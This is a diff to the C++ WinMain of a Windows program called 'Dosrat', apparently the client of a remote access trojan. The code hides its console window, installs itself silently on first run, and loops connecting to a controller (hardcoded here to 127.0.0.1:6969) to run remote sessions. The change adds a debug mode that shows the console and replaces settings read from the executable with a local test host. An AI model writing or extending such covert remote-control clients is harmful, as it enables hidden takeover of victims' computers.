@@ -6,8 +6,9 @@
 
 using json = nlohmann::json;
 
-string Version = "2.0.0-b.2";
-int VersioneCompatibile = 0;
+string Version = "2.0.0-b.3";
+int VersioneCompatibile = 1;
+bool DEBUG = false;
 
 #include "Classi.h"
 #include "Funzioni.h"
@@ -24,8 +25,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     Settaggi sett;
     EasyMSGB msgb;
 
+    if (du.CheckFile(du.GetModuleFilePath() + "DosratDebug"))
+        DEBUG = true;
+
     AllocConsole();
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    if (!DEBUG)
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    else
+        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
 
     if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
     {
@@ -38,7 +45,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (!IsInstalled())
         {
             short rtn = InstallClient();
-            //msgb.Ok("Codice installazione: " + to_string(rtn));
+
+            if(DEBUG)
+                msgb.Ok("Codice installazione: " + to_string(rtn));
+
             return 0;
         }
 
@@ -46,7 +56,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     else
     {
-        sett.GetSettingsFromExe();
+        sett.Host = "127.0.0.1";
+        sett.Porta = 6969;
     }
 
     su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%
@@ -65,10 +76,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     {
         while (!Client.Connect()) {}
         
-        //msgb.Ok("Connesso!");
+        if (DEBUG)
+            cout << "Ricevuta connessione" << endl;
 
         if (COMUNICAZIONI::Inizializzazione(Client.Sock))
         {
+            if (DEBUG)
+                cout << "Connessione accettata" << endl;
+
             switch (Sessione(Client))
             {
                 case 0:
@@ -81,12 +96,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                     return 0;
                     break;
             }
+
+            if (DEBUG)
+                cout << "Disconnesso" << endl;
         }
         Client.Stop();
         Client.StartClient();
     }
-
-    system("pause");
 
     return 0;
 }
